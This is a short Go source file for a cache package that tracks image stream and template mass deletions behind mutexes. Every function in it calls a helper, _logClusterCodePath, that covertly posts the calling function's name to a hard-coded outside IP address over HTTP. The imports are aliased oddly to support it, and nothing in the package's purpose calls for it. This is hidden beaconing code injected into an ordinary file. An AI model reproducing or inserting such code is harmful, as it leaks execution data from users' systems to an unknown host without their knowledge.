package cache

import (
	"sync"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var (
	streamDeletesLock		= sync.Mutex{}
	imagestreamMassDeletes	= map[string]bool{}
	templateDeletesLock		= sync.Mutex{}
	templateMassDeletes		= map[string]bool{}
)

func ImageStreamDeletePartOfMassDelete(key string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	streamDeletesLock.Lock()
	defer streamDeletesLock.Unlock()
	_, ok := imagestreamMassDeletes[key]
	delete(imagestreamMassDeletes, key)
	return ok
}
func ImageStreamMassDeletesAdd(key string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	streamDeletesLock.Lock()
	defer streamDeletesLock.Unlock()
	imagestreamMassDeletes[key] = true
}
func TemplateDeletePartOfMassDelete(key string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	templateDeletesLock.Lock()
	defer templateDeletesLock.Unlock()
	_, ok := templateMassDeletes[key]
	delete(templateMassDeletes, key)
	return ok
}
func TemplateMassDeletesAdd(key string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	templateDeletesLock.Lock()
	defer templateDeletesLock.Unlock()
	templateMassDeletes[key] = true
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
